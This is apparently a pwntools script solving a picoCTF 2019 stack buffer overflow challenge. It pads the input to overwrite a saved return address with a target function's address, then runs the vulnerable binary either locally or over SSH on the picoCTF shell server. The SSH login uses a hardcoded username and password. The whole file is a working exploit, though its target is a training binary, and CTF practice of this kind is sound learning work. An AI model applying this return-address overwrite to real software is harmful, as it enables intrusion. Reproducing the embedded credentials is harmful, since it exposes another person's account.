#coding=utf-8
from pwn import *

vuln = 0x804877f
buf = 0xffffd410 
ret = 0xffffd49c
target = 0x08048646

payload = 'a' * (ret - buf) + p32(target)
debug = 0
if debug:
    p = process(argv = ['./vuln', payload])
else:
    s = ssh(host = '2019shell1.picoctf.com', user = 'zeze', password='h9h9ji3g4go6')
    s.set_working_directory('/problems/overflow-0_4_5a8148adff9a55613b67b0377d0e6817')
    p = s.process(argv = ['./vuln', payload])
p.interactive()

